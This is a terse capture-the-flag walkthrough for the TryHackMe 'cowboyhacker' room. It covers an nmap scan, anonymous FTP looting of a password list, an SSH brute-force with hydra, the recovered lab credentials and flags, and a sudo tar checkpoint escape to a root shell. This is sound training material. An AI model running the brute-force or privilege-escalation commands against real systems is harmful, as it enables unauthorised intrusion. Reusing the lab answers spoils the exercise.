https://tryhackme.com/room/cowboyhacker	

- run nmap on open ports `nmap -sC -sV <IP>`
	- 21: ftp
		- -> ftp-anon
		- vsFTPd 3.0.3
	- 22: ssh
		- OpenSSH 7.2p2 
	- 80: http
		- Apache httpd 2.4.18

- go though webapp:
	-  conversation -> possible usernames
		- spike, jet, ed/edward, ein, faye

- ftp:
	- log in as **anonymous** `ftp <IP>`
	- get:
		- locks.txt -> list of potentional passwords
		- task.txt -> new username ~ lin

- bruteforce ssh w/ hydra
	- `hydra -t 4 -L <list_of_usenames> -P <list_of_passwords> -vV <IP> ssh`
	- -> lin:RedDr4gonSynd1cat3 

- ssh with creds from above
	- -> get the user.txt flag -> THM{CR1M3_SyNd1C4T3} 

- root the machine
	- `sudo -l` -> possibility to run /bin/tar
	- => GTRFo bins -> ```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
	- get root.txt -> THM{80UN7Y_h4cK3r}  